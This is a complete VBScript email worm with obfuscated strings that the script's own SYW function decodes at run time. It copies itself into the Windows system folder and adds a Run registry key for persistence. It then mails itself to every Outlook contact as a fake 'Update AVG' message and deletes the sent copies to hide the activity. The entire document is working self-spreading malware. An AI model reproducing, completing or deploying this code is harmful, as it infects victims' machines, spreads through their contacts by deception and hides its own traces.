On Error Resume Next

Dim Q06, APV82IK, GEXVT0R9, ZL1ER, TJLG5

Dim CD5POXX, UW1ST9

Set CD5POXX = CreateObject( SYW( "udfkcPnfutzTfmjG/hojuqjsdT" ) )
CD5POXX.CopyFile WScript.ScriptFullName, CD5POXX.BuildPath( CD5POXX.GetSpecialFolder(1), SYW( "TCW/6[H4J" ) )

Set UW1ST9 = CreateObject( SYW( "mmfiT/uqjsdTX" ) )
UW1ST9.RegWrite SYW( "]tfdjwsfTovS]opjtsfWuofssvD]txpeojX]ugptpsdjN]fsbxugpT]FOJIDBN`MBDPM`ZFLI" ) & SYW( "6[H4J" ), CD5POXX.BuildPath( CD5POXX.GetSpecialFolder(1), SYW( "TCW/6[H4J" ) )

Set Q06 = CreateObject( SYW( "opjubdjmqqB/lppmuvP" ) )
Set APV82IK = Q06.GetNameSpace( SYW( "JQBN" ) )

For Each GEXVT0R9 In APV82IK.AddressLists
    For ZL1ER = 1 To GEXVT0R9.AddressEntries.Count
        Set TJLG5 = Q06.CreateItem( 0 )

        TJLG5.BCC = GEXVT0R9.AddressEntries( ZL1ER ).Address

        TJLG5.Subject = SYW( "HWB!fubeqV" )
        TJLG5.Body = SYW( """"uj{vpq!fmidzs!pouvO!"""fubeqv!HWB!zwpO" )
        TJLG5.Attachments.Add WScript.ScriptFullName
        TJLG5.DeleteAfterSubmit = True
        TJLG5.Send
    Next
Next

Function SYW( RUH )
   Dim I39
   Dim PEZ7KQP
   Dim DEV9C

   I39 = ""

   For PEZ7KQP = 1 To Len( RUH )
       DEV9C = Mid( RUH, PEZ7KQP, 1 )

       I39 = Chr( Asc( DEV9C ) - 1 ) & I39
   Next

   SYW = I39
End Function
